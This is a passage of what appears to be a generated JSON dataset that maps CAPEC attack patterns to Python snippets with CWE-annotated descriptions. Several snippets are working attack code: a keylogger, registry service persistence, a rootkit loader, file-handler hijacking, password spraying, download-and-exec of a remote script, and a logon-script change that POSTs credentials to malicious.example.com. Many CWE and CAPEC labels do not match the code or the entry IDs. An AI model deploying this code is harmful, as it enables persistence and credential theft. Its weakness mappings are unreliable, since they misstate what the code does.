        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-506: Embedded Malicious Code\n# The downloaded script could contain malicious code\n\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n# This is not directly shown in the snippet but could be part of the downloaded script\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# This is not directly shown in the snippet but could be part of the downloaded script",
        "description": "This Python code snippet demonstrates a scenario where a script is downloaded from an untrusted source and executed without any integrity checks. This embodies the CAPEC 'Local Execution of Code' by potentially allowing an adversary to execute malicious code on the target system. The code highlights CWE-494 by downloading and executing code without verifying its origin or integrity. It also touches on CWE-829 by including functionality from an untrusted control sphere. CWE-506 is represented by the potential for the downloaded script to contain malicious code. CWE-1265 and CWE-1037 are mentioned as potential issues that could arise within the downloaded script, though they are not directly shown in this snippet."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "import os\nimport winreg\n\n# CWE-284: Improper Access Control\n# CWE-1392: Use of Default Credentials\n# CWE-1188: Initialization of a Resource with an Insecure Default\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n\n# Function to add a new service to Windows registry\n# This service will run at startup with elevated privileges\n# The service name is disguised as a legitimate system service\n\ndef add_service_to_registry(service_name, service_path):\n    try:\n        # Open the registry key where services are registered\n        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\\CurrentControlSet\\Services', 0, winreg.KEY_SET_VALUE)\n        \n        # Create a new key for the service\n        service_key = winreg.CreateKey(key, service_name)\n        \n        # Set the path to the service executable\n        winreg.SetValueEx(service_key, 'ImagePath', 0, winreg.REG_SZ, service_path)\n        \n        # Set the service to start automatically\n        winreg.SetValueEx(service_key, 'Start', 0, winreg.REG_DWORD, 2)\n        \n        # Set the service type to own process\n        winreg.SetValueEx(service_key, 'Type', 0, winreg.REG_DWORD, 0x10)\n        \n        print(f'Service {service_name} added successfully.')\n    except Exception as e:\n        print(f'Failed to add service: {e}')\n\n# Example usage\n# This would typically be run with elevated privileges\nadd_service_to_registry('FakeSystemService', 'C:\\path\\to\\malicious.exe')",
        "description": "This Python code snippet demonstrates how an adversary might add a new service to the Windows registry, ensuring it runs at startup with elevated privileges. The service name is disguised to appear legitimate. The code opens the registry key for services, creates a new service key, sets the path to the service executable, configures the service to start automatically, and sets the service type. This embodies the CAPEC 'Install New Service' by showing how a new service can be installed to run with elevated privileges at startup. The related CWEs are represented by the improper access control (CWE-284), use of default credentials (CWE-1392), initialization with insecure defaults (CWE-1188), and potential .NET misconfiguration (CWE-520)."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "import os\nimport subprocess\n\ndef modify_service(service_name, new_command):\n    # CWE-284: Improper Access Control\n    if not os.geteuid() == 0:\n        raise PermissionError(\"This script must be run as root\")\n\n    # CWE-522: Insufficiently Protected Credentials\n    # Storing credentials in plain text (for demonstration purposes)\n    credentials = \"admin:password\"\n\n    # CWE-15: External Control of System or Configuration Setting\n    # Allowing external input to modify system service\n    service_file = f\"/etc/systemd/system/{service_name}.service\"\n    with open(service_file, 'r') as file:\n        service_data = file.read()\n\n    # CWE-908: Use of Uninitialized Resource\n    if not service_data:\n        raise ValueError(\"Service file is empty or uninitialized\")\n\n    # Modify the service command\n    new_service_data = service_data.replace(\"ExecStart=/usr/bin/old_command\", f\"ExecStart={new_command}\")\n    with open(service_file, 'w') as file:\n        file.write(new_service_data)\n\n    # Reload the systemd manager configuration\n    subprocess.run([\"systemctl\", \"daemon-reload\"])\n    subprocess.run([\"systemctl\", \"restart\", service_name])\n\n# Example usage\nmodify_service(\"example_service\", \"/usr/bin/new_command\")",
        "description": "This Python code snippet demonstrates the concept of modifying an existing service, which is the main idea of the CAPEC. The function `modify_service` takes a service name and a new command to replace the existing command in the service's configuration file. The code includes several CWE-related vulnerabilities:\n\n1. CWE-284: Improper Access Control - The script checks if it is run as root but does not enforce proper access control mechanisms.\n2. CWE-522: Insufficiently Protected Credentials - Credentials are stored in plain text, which is insecure.\n3. CWE-15: External Control of System or Configuration Setting - The function allows external input to modify system service settings.\n4. CWE-908: Use of Uninitialized Resource - The code does not properly handle the case where the service file might be empty or uninitialized.\n\nThe code represents the potential risks and vulnerabilities associated with modifying existing services in an operating system."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-284: Improper Access Control\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-78: OS Command Injection\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n\ndef install_rootkit():\n    # Simulate improper access control by running as an unauthorized user\n    if os.geteuid() != 0:\n        print(\"This script must be run as root!\")\n        return\n\n    # CWE-78: OS Command Injection vulnerability\n    malicious_command = \"echo 'rootkit installed' > /tmp/rootkit.log\"\n    os.system(malicious_command)\n\n    # CWE-506: Embedded Malicious Code\n    # CWE-507: Trojan Horse\n    # Load a malicious shared library (rootkit)\n    rootkit_path = \"/tmp/malicious_rootkit.so\"\n    ctypes.CDLL(rootkit_path)\n\n    print(\"Rootkit installed and loaded.\")\n\ninstall_rootkit()",
        "description": "This Python code snippet demonstrates the installation of a rootkit by exploiting several common vulnerabilities. The script first checks if it is running with root privileges (CWE-284: Improper Access Control). It then executes a command to simulate the installation of a rootkit, which is vulnerable to OS Command Injection (CWE-78). The script proceeds to load a malicious shared library (CWE-506: Embedded Malicious Code and CWE-507: Trojan Horse), simulating the behavior of a rootkit that hides its presence and alters system functionality. This code represents the main idea of the CAPEC by showing how an adversary can exploit these weaknesses to install and hide a rootkit on a system."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "import os\n\n# Function to check if user is admin\n# This check is performed on the client-side\n# CWE-602: Client-Side Enforcement of Server-Side Security\ndef is_admin():\n    return os.getenv('USER') == 'admin'\n\n# Function to access restricted functionality\n# CWE-424: Improper Protection of Alternate Path\ndef access_restricted_functionality():\n    if is_admin():\n        print('Access granted to restricted functionality.')\n    else:\n        print('Access denied. Admin privileges required.')\n\n# Main function\nif __name__ == '__main__':\n    # Simulate an attacker bypassing the client-side check\n    # CWE-693: Protection Mechanism Failure\n    os.environ['USER'] = 'admin'\n    access_restricted_functionality()",
        "description": "This Python code snippet demonstrates a vulnerability where client-side enforcement of security is used to protect server-side functionality (CWE-602). The `is_admin` function checks if the user is an admin based on an environment variable, which can be easily manipulated by an attacker. The `access_restricted_functionality` function grants access based on this client-side check, representing an improper protection of alternate paths (CWE-424). The main function simulates an attacker bypassing the client-side check by setting the environment variable to 'admin', showcasing a protection mechanism failure (CWE-693). This embodies the main idea of the CAPEC, where an adversary bypasses functionality intended to protect the system."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "import paramiko\n\n# Weak password requirements\nusername = 'user'\npassword = 'password123'  # CWE-521: Weak Password Requirements\n\n# Single-factor authentication\nclient = paramiko.SSHClient()\nclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\ntry:\n    # Insufficiently protected credentials\n    client.connect('example.com', username=username, password=password)  # CWE-522: Insufficiently Protected Credentials\n    stdin, stdout, stderr = client.exec_command('ls')\n    print(stdout.read().decode())\nexcept paramiko.AuthenticationException:\n    print('Authentication failed.')\nfinally:\n    client.close()",
        "description": "This Python code snippet demonstrates a scenario where an attacker could use stolen credentials to access a remote service via SSH. The code uses the Paramiko library to establish an SSH connection with a server. The username and password are hardcoded with weak password requirements (CWE-521). The connection uses single-factor authentication (CWE-308) and transmits credentials in an insecure manner (CWE-522). This setup embodies the CAPEC 'Remote Services with Stolen Credentials' by showing how an attacker could leverage weak security practices to gain unauthorized access to a system."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "import os\nimport winreg\n\n# Vulnerable function to replace file extension handler\n# This function modifies the registry to change the handler for .txt files\n# CWE-284: Improper Access Control\n# CWE-73: External Control of File Name or Path\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n# CWE-64: Windows Shortcut Following (.LNK)\ndef replace_file_handler(extension, new_handler):\n    try:\n        # Open the registry key where file handlers are stored\n        reg_path = f'Software\\\\Classes\\\\{extension}\\\\shell\\\\open\\\\command'\n        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:\n            # Set the new handler for the file extension\n            winreg.SetValueEx(key, '', 0, winreg.REG_SZ, new_handler)\n            print(f'Successfully changed handler for {extension} to {new_handler}')\n    except Exception as e:\n        print(f'Failed to change handler: {e}')\n\n# Example usage\nreplace_file_handler('.txt', 'C:\\\\malicious_program.exe %1')",
        "description": "This Python code snippet demonstrates a vulnerable function that replaces the file handler for a given file extension by modifying the Windows registry. The function `replace_file_handler` takes an extension and a new handler as arguments and sets the new handler in the registry. This embodies the CAPEC 'Replace File Extension Handlers' by showing how an application can modify the file handler for a given file extension to call an arbitrary program when a file with that extension is opened. The code is vulnerable to several CWEs: CWE-284 (Improper Access Control) because it does not restrict access to the registry modification, CWE-73 (External Control of File Name or Path) because it allows user input to control the file handler path, CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) because it relies on the file extension to determine behavior, and CWE-64 (Windows Shortcut Following (.LNK)) because it does not handle .LNK files properly."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "import os\nimport time\n\n# Using an obsolete function to schedule a task\n# This is vulnerable as it uses deprecated methods and lacks proper synchronization\n# CWE-477: Use of Obsolete Function\n# CWE-362: Race Condition\n# CWE-662: Improper Synchronization\n\n# Obsolete function to schedule a task\nos.system('echo \"python3 /path/to/script.py\" | at now + 1 minute')\n\ndef modify_data(file_path, data):\n    # CWE-1101: Reliance on Runtime Component in Generated Code\n    with open(file_path, 'w') as file:\n        file.write(data)\n\n# Simulate a race condition by modifying the same file from two different places\nfile_path = '/tmp/data.txt'\nmodify_data(file_path, 'Initial data')\n\n# Schedule another modification to the same file after 1 minute\nos.system(f'echo \"python3 -c \\'import time; time.sleep(60); open(\\\"{file_path}\\\", \\\"w\\\").write(\\\"Modified data\\\")\\'\" | at now + 1 minute')\n\n# Immediate modification to the file\nmodify_data(file_path, 'Immediate data')\n",
        "description": "This Python code snippet demonstrates the deprecated CAPEC 'Schedule Software To Run' by using an obsolete function to schedule a task. The code uses the `os.system` function to schedule a Python script to run after one minute using the `at` command, which is considered obsolete (CWE-477). Additionally, the code introduces a race condition (CWE-362) and improper synchronization (CWE-662) by scheduling a file modification to occur after one minute while also modifying the same file immediately. This can lead to inconsistent data states. The code also relies on runtime components for execution (CWE-1101), as it uses the `at` command and the Python runtime to perform scheduled tasks."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "import os\nimport shutil\n\n# CWE-284: Improper Access Control\n# This function does not properly check permissions before replacing the executable\n\ndef replace_trusted_executable(trusted_path, malicious_path):\n    try:\n        # CWE-78: OS Command Injection\n        # Using shutil.move without proper validation can lead to command injection\n        shutil.move(malicious_path, trusted_path)\n        print(f\"Replaced {trusted_path} with {malicious_path}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\ntrusted_executable = \"/usr/bin/trusted_app\"\nmalicious_executable = \"/tmp/malicious_app\"\nreplace_trusted_executable(trusted_executable, malicious_executable)",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can replace a trusted executable with a malicious one. The function `replace_trusted_executable` takes the path of a trusted executable and a malicious executable as arguments and replaces the trusted executable with the malicious one using `shutil.move`. The code does not perform any access control checks (CWE-284) to ensure that the user has the necessary permissions to replace the executable. Additionally, it does not validate the inputs, which could lead to OS command injection (CWE-78). This snippet embodies the main idea of the CAPEC 'Replace Trusted Executable' by showing how an attacker can exploit weaknesses in privilege management or access control to replace a trusted executable with a malicious version."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\ndef send_disruptive_signal(target_ip, target_port, message):\n    try:\n        # Establish a connection to the target satellite's uplink station\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((target_ip, target_port))\n\n        # Send a disruptive signal (message) to the target\n        s.sendall(message.encode('utf-8'))\n\n        # CWE-924: No integrity check on the message\n        # CWE-940: No verification of the source of the communication\n        # CWE-923: No restriction to ensure communication with the correct endpoint\n        print(f\"Disruptive signal sent to {target_ip}:{target_port}\")\n    except Exception as e:\n        print(f\"Failed to send disruptive signal: {e}\")\n    finally:\n        s.close()\n\n# Example usage\nsend_disruptive_signal('192.168.1.100', 8080, 'DISRUPTIVE_SIGNAL')",
        "description": "This Python code snippet demonstrates a simplified version of an orbital jamming attack. The function `send_disruptive_signal` establishes a connection to a target satellite's uplink station and sends a disruptive signal. The code embodies several vulnerabilities: it does not verify the source of the communication (CWE-940), does not restrict the communication channel to intended endpoints (CWE-923), and does not enforce message integrity during transmission (CWE-924). These weaknesses can be exploited by an adversary to disrupt the satellite's intended transmission, aligning with the CAPEC description of orbital jamming."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "import hashlib\nimport time\n\n# Simulate a database of user credentials\nuser_db = {\n    'user1': hashlib.sha256('password123'.encode()).hexdigest(),\n    'user2': hashlib.sha256('mypassword'.encode()).hexdigest()\n}\n\n# Function to authenticate user\nfailed_attempts = {}\n\ndef authenticate(username, password):\n    global failed_attempts\n    current_time = time.time()\n    if username in failed_attempts and failed_attempts[username]['count'] >= 5 and current_time - failed_attempts[username]['last_attempt'] < 300:\n        print('Account locked due to too many failed attempts. Please try again later.')\n        return False\n    hashed_password = hashlib.sha256(password.encode()).hexdigest()\n    if username in user_db and user_db[username] == hashed_password:\n        print('Authentication successful')\n        failed_attempts[username] = {'count': 0, 'last_attempt': current_time}\n        return True\n    else:\n        if username not in failed_attempts:\n            failed_attempts[username] = {'count': 0, 'last_attempt': current_time}\n        failed_attempts[username]['count'] += 1\n        failed_attempts[username]['last_attempt'] = current_time\n        print('Authentication failed')\n        return False\n\n# Example usage\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'password123')",
        "description": "This Python code snippet demonstrates a simple authentication system that embodies the main idea of CAPEC-Use of Known Domain Credentials. The code includes a user database with hashed passwords and an authentication function. The function checks for excessive failed authentication attempts (CWE-307) and locks the account if there are too many attempts within a short time frame. The code uses single-factor authentication (CWE-308) and relies on password-based authentication (CWE-309). The hashed passwords are stored in the user database, but the code does not implement password aging (CWE-262, CWE-263). This example highlights the vulnerabilities associated with using known domain credentials and the related weaknesses."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "import os\nimport getpass\nimport smbclient\n\n# CWE-521: Weak Password Requirements\nusername = input('Enter admin username: ')\npassword = getpass.getpass('Enter admin password: ')\n\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\ntry:\n    smbclient.register_session('server_name', username=username, password=password)\n    print('Authentication successful')\n    # Accessing Windows Admin Share\n    files = smbclient.listdir('\\\\server_name\\C$')\n    for file in files:\n        print(file)\nexcept smbclient.SMBAuthenticationError:\n    print('Authentication failed')\n\n# CWE-522: Insufficiently Protected Credentials\n# Storing credentials in an insecure manner\nwith open('credentials.txt', 'w') as cred_file:\n    cred_file.write(f'{username}:{password}')",
        "description": "This Python code snippet demonstrates a scenario where an adversary could exploit weak security practices to access Windows Admin Shares using stolen or guessed credentials. The code prompts the user for a username and password (CWE-521: Weak Password Requirements) and uses single-factor authentication (CWE-308) with a password system (CWE-309) to authenticate against a Windows server. If authentication is successful, it lists the files in the C$ admin share. Additionally, the code stores the credentials in a plaintext file (CWE-522: Insufficiently Protected Credentials), highlighting the risk of insecure credential storage. This snippet embodies the main idea of the CAPEC by showing how an attacker could leverage weak authentication mechanisms and poor credential management to gain unauthorized access."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-378: Creation of Temporary File With Insecure Permissions\n# Create a temporary file in a shared directory with insecure permissions\nshared_dir = '/tmp/shared'\nos.makedirs(shared_dir, exist_ok=True)\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-494: Download of Code Without Integrity Check\n# CWE-284: Improper Access Control\n# CWE-433: Unparsed Raw Web Content Delivery\n# Upload a malicious script to the shared directory\nmalicious_script = '''#!/bin/bash\necho \"Malicious code executed\"\n'''\n\n# Create a temporary file with insecure permissions\nwith tempfile.NamedTemporaryFile(dir=shared_dir, delete=False) as temp_file:\n    temp_file.write(malicious_script.encode('utf-8'))\n    temp_file_name = temp_file.name\n\n# Set insecure permissions\nos.chmod(temp_file_name, 0o777)\n\nprint(f\"Malicious script uploaded to {temp_file_name}\")",
        "description": "This Python code snippet demonstrates a scenario where an adversary manipulates files in a shared location by adding a malicious script. The code creates a temporary file in a shared directory with insecure permissions (CWE-378). It then uploads a malicious script to this shared directory without any integrity checks (CWE-434, CWE-494). The script is given full permissions (CWE-284), making it executable by any user. This represents the CAPEC 'Modify Shared File' where the tainted content is executed when accessed by a user. The shared directory and the script are created in a way that could be exploited by an attacker to execute malicious code."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/var/www/uploads'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file part', 400\n    file = request.files['file']\n    if file.filename == '':\n        return 'No selected file', 400\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))\n    return 'File uploaded successfully', 200\n\n@app.route('/uploads/<filename>')\ndef uploaded_file(filename):\n    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that allows users to upload files to a directory under the web root and then access those files via a URL. The '/upload' route handles file uploads, saving them to the '/var/www/uploads' directory. The '/uploads/<filename>' route serves the uploaded files. This code embodies the CAPEC 'Add Malicious File to Shared Webroot' by demonstrating how an adversary could upload a malicious file to a web server and then access it, potentially causing the server to execute the malicious content. The code also highlights several related CWEs: improper access control (CWE-284), storage of files with sensitive data under the web root (CWE-219), and reliance on file name or extension (CWE-646)."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "import os\n\n# CWE-798: Use of Hard-coded Credentials\nADMIN_CREDENTIALS = {'username': 'admin', 'password': 'admin123'}\n\n# CWE-284: Improper Access Control\nlogon_script_path = '/etc/profile.d/logon_script.sh'\n\n# Function to modify the logon script\ndef modify_logon_script():\n    try:\n        with open(logon_script_path, 'a') as logon_script:\n            # CWE-259: Use of Hard-coded Password\n            logon_script.write('\\n# Malicious code to run at logon\\n')\n            logon_script.write('echo \"Malicious code executed\"\\n')\n            logon_script.write('curl -X POST -d \"username={}\" -d \"password={}\" http://malicious.example.com\\n'.format(ADMIN_CREDENTIALS['username'], ADMIN_CREDENTIALS['password']))\n        print('Logon script modified successfully.')\n    except Exception as e:\n        print(f'Failed to modify logon script: {e}')\n\n# Simulate an attacker modifying the logon script\nmodify_logon_script()",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker modifies a logon script to maintain persistence and exfiltrate credentials. The script appends malicious code to a logon script located at '/etc/profile.d/logon_script.sh'. The malicious code includes a hard-coded password (CWE-259) and credentials (CWE-798) that are sent to a remote server whenever a user logs on. This represents the CAPEC 'Run Software at Logon' by showing how an attacker can exploit improper access control (CWE-284) to insert malicious code into a logon script, thereby achieving persistence and potentially bypassing security measures."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "import time\n\n# List of common passwords to try\ncommon_passwords = ['password123', '123456', 'qwerty', 'letmein', 'welcome']\n\n# List of user accounts\nuser_accounts = ['user1', 'user2', 'user3', 'user4', 'user5']\n\n# Simulated function to check password (always returns False for demonstration)\ndef check_password(username, password):\n    # In a real scenario, this would check the password against a stored hash\n    return False\n\n# Password spraying attack simulation\nfor password in common_passwords:\n    for user in user_accounts:\n        if check_password(user, password):\n            print(f\"Password for {user} is {password}\")\n        time.sleep(1)  # Sleep to avoid rapid lockout\n    time.sleep(60)  # Wait before trying the next password to avoid detection",
        "description": "This Python code snippet simulates a password spraying attack. It iterates over a list of common passwords and attempts to authenticate each user account with each password. The `check_password` function is a placeholder that always returns False, representing a failed login attempt. The code includes delays (`time.sleep`) to avoid rapid or frequent account lockouts, mimicking the behavior of an adversary trying to remain undetected. This snippet embodies the main idea of CAPEC-111 (Password Spraying) and highlights related weaknesses such as weak password requirements (CWE-521), improper restriction of excessive authentication attempts (CWE-307), and reliance on single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "import hashlib\n\n# Vulnerable code: Using a one-way hash without a salt\npassword = 'user_password'\nhash_object = hashlib.sha256(password.encode())\nhash_password = hash_object.hexdigest()\nprint(f'Hashed password: {hash_password}')\n\n# Vulnerable code: Using a one-way hash with a predictable salt\nsalt = '1234'  # Predictable salt\nhash_object_with_salt = hashlib.sha256((salt + password).encode())\nhash_password_with_salt = hash_object_with_salt.hexdigest()\nprint(f'Hashed password with predictable salt: {hash_password_with_salt}')",
        "description": "This Python code snippet demonstrates two common vulnerabilities related to password hashing. The first part of the code shows the use of a one-way hash (SHA-256) without a salt, which is vulnerable to precomputed hash attacks (rainbow tables). The second part of the code uses a predictable salt ('1234'), which does not provide sufficient protection against such attacks. Both examples highlight the importance of using a strong, unique salt for each password to enhance security."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "import os\nimport subprocess\n\n# Vulnerable code: Using obsolete function 'os.popen' to obtain data\n# CWE-477: Use of Obsolete Function\n# CWE-350: Reliance on DNS Lookups in a Security Decision\n\n# Function to get IP address of a domain (vulnerable to DNS spoofing)\ndef get_ip_address(domain):\n    # Using obsolete function 'os.popen' to execute 'nslookup'\n    result = os.popen(f'nslookup {domain}').read()\n    return result\n\n# Example usage\nif __name__ == '__main__':\n    domain = 'example.com'\n    ip_address = get_ip_address(domain)\n    print(f'The IP address of {domain} is:\\n{ip_address}')",
        "description": "This Python code snippet demonstrates a vulnerable approach to obtaining data via utilities, specifically using the obsolete function 'os.popen' to execute the 'nslookup' command. This embodies the deprecated CAPEC concept of obtaining data via utilities. The code is also vulnerable to CWE-350 (Reliance on DNS Lookups in a Security Decision) as it relies on DNS lookups, which can be spoofed. The use of 'os.popen' is flagged under CWE-477 (Use of Obsolete Function), indicating that the code has not been actively reviewed or maintained. This combination of issues highlights the risks associated with using outdated methods and relying on potentially insecure data sources."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "import pynput.keyboard as keyboard\n\nclass Keylogger:\n    def __init__(self):\n        self.log = \"\"\n\n    def on_press(self, key):\n        try:\n            self.log += key.char\n        except AttributeError:\n            if key == key.space:\n                self.log += ' '\n            else:\n                self.log += ' ' + str(key) + ' '\n\n    def start(self):\n        with keyboard.Listener(on_press=self.on_press) as listener:\n            listener.join()\n\nif __name__ == \"__main__\":\n    keylogger = Keylogger()\n    keylogger.start()",
        "description": "This Python code snippet demonstrates a simple keylogger using the 'pynput' library. The keylogger captures all keystrokes made by the user and stores them in a log. The 'on_press' method handles the event of a key press, appending the character to the log. Special keys like space are handled separately to ensure readability. The 'start' method initiates the keylogger, which listens for key presses indefinitely. This code embodies the main idea of CAPEC-564 (Capture Credentials via Keylogger) by capturing user input, which could include sensitive information like passwords. The related CWEs provide context on potential weaknesses in authentication mechanisms that could be exploited by such a keylogger."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "import os\nimport getpass\n\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n# Collecting sensitive information from the user\nusername = input('Enter your username: ')\npassword = getpass.getpass('Enter your password: ')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Storing sensitive information in an environment variable (unsafe practice)\nos.environ['USER_CREDENTIALS'] = f'{username}:{password}'\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Printing sensitive information to the console (unsafe practice)\nprint(f'Stored credentials: {os.environ[\"USER_CREDENTIALS\"]}')\n\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n# Simulating a process that runs with elevated privileges\ntry:\n    # This is a placeholder for a process that requires elevated privileges\n    print('Running a sensitive operation with elevated privileges...')\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates the CAPEC concept of 'Collect Data as Provided by Users' by capturing sensitive user information (username and password) and storing it in an environment variable. The code also prints the sensitive information to the console, which is an unsafe practice. This snippet embodies several related CWEs: CWE-214 by using visible sensitive information in process invocation, CWE-497 by exposing sensitive system information, CWE-200 by exposing sensitive information to unauthorized actors, and CWE-520 by simulating a process that runs with elevated privileges. The code highlights the risks associated with improper handling and exposure of sensitive information."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "import hashlib\nimport os\n\n# DEPRECATED: Use of MD5, an obsolete function for hashing\n# CWE-477: Use of Obsolete Function\n# CWE-391: Unchecked Error Condition\n\ndef generate_md5_hash(data):\n    try:\n        md5_hash = hashlib.md5()\n        md5_hash.update(data.encode('utf-8'))\n        return md5_hash.hexdigest()\n    except Exception as e:\n        # CWE-391: Unchecked Error Condition\n        pass  # Error is ignored, which is a bad practice\n\n# Example usage\nuser_input = input(\"Enter some data to hash: \")\nhash_value = generate_md5_hash(user_input)\nprint(f\"MD5 Hash: {hash_value}\")\n\n# CWE-217: Failure to Protect Stored Data from Modification\n# Storing the hash in a file without proper protection\nwith open('hashes.txt', 'a') as file:\n    file.write(f\"{hash_value}\\n\")",
        "description": "This Python code snippet demonstrates the deprecated CAPEC concept of 'Signature-Based Avoidance' by using deprecated and insecure practices. The code uses the obsolete MD5 hashing function (CWE-477) to generate a hash of user input. It also ignores potential exceptions (CWE-391), which could lead to unnoticed errors. Additionally, the code stores the generated hash in a file without any protection against modification (CWE-217). This example highlights the risks associated with using outdated functions and ignoring error handling, which can lead to security vulnerabilities."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "import logging\nimport os\n\n# CWE-778: Insufficient Logging\nlogging.basicConfig(filename='/var/log/app.log', level=logging.ERROR)\n\n# Function to simulate blocking log delivery to central repository\n# CAPEC: Block Logging to Central Repository\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n# CWE-532: Insertion of Sensitive Information into Log File\n\ndef block_log_delivery():\n    try:\n        # Simulate blocking by renaming the log file (making it inaccessible)\n        os.rename('/var/log/app.log', '/var/log/app.log.bak')\n        logging.error('Log delivery blocked to central repository')\n    except Exception as e:\n        print(f'Error blocking log delivery: {e}')\n\n# CWE-294: Authentication Bypass by Capture-replay\n# Simulate an authentication function\n\ndef authenticate(user, password):\n    if user == 'admin' and password == 'password123':\n        logging.info('User authenticated successfully')\n        return True\n    else:\n        logging.warning('Authentication failed')\n        return False\n\n# Main function to demonstrate the vulnerability\nif __name__ == '__main__':\n    # Simulate an authentication attempt\n    authenticate('admin', 'password123')\n    # Block log delivery\n    block_log_delivery()",
        "description": "This Python code snippet demonstrates the concept of blocking log delivery to a central repository, as described in the CAPEC. The `block_log_delivery` function simulates this by renaming the log file, making it inaccessible. The logging configuration is set to log only errors (CWE-778: Insufficient Logging), and sensitive information is logged (CWE-532: Insertion of Sensitive Information into Log File). The `authenticate` function simulates an authentication process, which could be vulnerable to capture-replay attacks (CWE-294: Authentication Bypass by Capture-replay). The code also touches on the exposure of version-control repositories (CWE-527) by demonstrating how logs can be mishandled and made inaccessible."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "import os\n\n# CWE-774: No limit on file descriptors\nfile_descriptors = []\nfor i in range(10000):  # Arbitrary large number to simulate DoS\n    fd = os.open('/tmp/testfile', os.O_CREAT | os.O_WRONLY)\n    file_descriptors.append(fd)\n\n# CWE-434: Unrestricted upload of dangerous file type\nwith open('/tmp/malicious.exe', 'wb') as f:\n    f.write(b'MZ')  # Writing a simple PE header to simulate an executable\n\n# CWE-646: Reliance on file name or extension\nfilename = 'safe.txt'\nif filename.endswith('.txt'):\n    with open(filename, 'w') as f:\n        f.write('This is actually an executable disguised as a text file.')\n\n# CWE-409: Improper handling of highly compressed data\ncompressed_data = b'x' * 1000000  # Simulating a large decompressed output\nwith open('/tmp/compressed.gz', 'wb') as f:\n    f.write(compressed_data)\n\n# CWE-69: Improper handling of Windows ADS\nwith open('normalfile.txt:ads', 'w') as f:\n    f.write('Hidden data in ADS')",
